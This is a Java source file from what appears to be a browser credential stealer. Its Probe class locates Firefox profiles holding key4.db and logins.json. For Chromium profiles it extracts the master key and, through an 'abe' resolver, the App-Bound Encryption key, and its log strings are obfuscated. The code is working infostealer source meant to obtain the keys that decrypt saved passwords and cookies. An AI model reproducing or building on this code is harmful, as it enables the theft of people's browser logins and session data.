package noface.browsers;

import noface.browsers.abe.Resolve;
import noface.config.Log;
import noface.config.S;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public final class Probe {

    public static List<Profile> find(Paths.Def browser) {
        List<Profile> out = new ArrayList<>();
        Path userData = browser.userData();
        if (!Files.isDirectory(userData)) return out;

        if (!browser.chromium()) {
            File[] dirs = userData.toFile().listFiles(File::isDirectory);
            if (dirs != null) {
                for (File dir : dirs) {
                    if (new File(dir, "key4.db").exists() || new File(dir, "logins.json").exists()) {
                        out.add(new Profile(browser.name(), dir.getName(), dir.toPath(), null, null));
                    }
                }
            }
            return out;
        }

        byte[] master = Key.master(browser.localState());
        byte[] abe = null;
        try {
            if (Key.hasAbe(browser.localState())) {
                Log.out(S.e("[*] ") + browser.name() + S.e(" abe..."));
                abe = Resolve.get(browser);
            }
        } catch (Throwable t) {
            Log.err(S.e("abe skip: ") + browser.name());
        }

        Path def = userData.resolve("Default");
        if (Files.isDirectory(def)) {
            out.add(new Profile(browser.name(), "Default", def, master, abe));
        }

        File[] dirs = userData.toFile().listFiles(f -> f.isDirectory() && f.getName().startsWith("Profile "));
        if (dirs != null) {
            for (File dir : dirs) {
                out.add(new Profile(browser.name(), dir.getName(), dir.toPath(), master, abe));
            }
        }
        return out;
    }

    private Probe() {}
}
